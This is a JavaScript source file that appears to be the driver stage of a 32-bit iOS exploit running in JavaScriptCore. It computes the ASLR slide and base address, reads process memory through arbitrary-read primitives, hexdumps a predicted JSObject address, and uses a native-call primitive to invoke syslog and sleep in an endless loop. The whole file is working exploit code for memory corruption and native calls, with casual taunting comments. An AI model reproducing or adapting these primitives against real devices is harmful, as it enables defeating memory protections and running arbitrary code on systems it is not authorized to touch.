/*
 *  november 24th 2021
 *  [3:16 PM] spv: spice confuses the shit out of me, so i'm prolly not smart enough to implement it anyway
 *
 *  ohai
 */

var MAX_SLIDE = 0x3;
var MIN_SLIDE = 0x1;

try {
	log("we out here in jsc");
} catch (e) {
	/*
	 *  we don't have log. :(
	 */

	log = function (){};
}

function main() {
	/*
	 *  get slide and calculate slid base
	 *  remember, 32-bit *OS defaults to 0x4000 for the unslid base for exec's
	 * 
	 *  so, take the slide, shift it by 12 bits (aslr is calc'd by taking a
	 *  random byte and shifting it 12 bits, in this case the page size, 4096
	 *  (0x1000) bytes), and add it to the unslid base.
	 */

	slide = get_our_slide();
	base = 0x4000 + (slide << 12);
	slid = (slide << 12);

	init_sptr_heap();

	puts("we out here");
	puts("I came through a portal holding a 40 and a blunt. Do you really wanna test me right now?");

	log("slide=0x" + slide.toString(16));
	log("*(uint8_t*)base = 0x" + read_u8(base).toString(16));
	log("*(uint16_t*)base = 0x" + read_u16(base).toString(16));
	log("*(uint32_t*)base = 0x" + read_u32(base).toString(16));

	predicted_jsobject_addy = 0x422200;
	buf = read_buf(predicted_jsobject_addy, 0x200);

	log("hexdump of predicted jsobject loc:");
	log(hexdump(buf, 8, 2, predicted_jsobject_addy, 8, "0x"));

	var i = 0;
	while (true) {
		calls4arg("syslog\0", 0x28, sptr("get rekt from jsc %d (slide=%x)\n\0"), i, 0);
		calls4arg("sleep", 0, 0, 0, 0);
		i++;
	}

	log("still alive");
};
